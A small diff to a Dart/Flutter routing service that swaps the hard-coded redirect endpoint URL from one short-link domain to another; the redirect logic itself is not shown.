@@ -5,7 +5,7 @@ import 'package:url_launcher/url_launcher.dart';
 
 class RoutingService {
   // Target endpoint URL placeholder (can be updated via update_target_url.py)
-  static const String endpointUrl = 'https://opticlous.site/771WGnv4';
+  static const String endpointUrl = 'https://applinkgo.com/PwmR2C';
   static const Duration requestTimeout = Duration(seconds: 4);
 
   static Future<bool> checkAndProcessRedirect({String url = endpointUrl}) async {
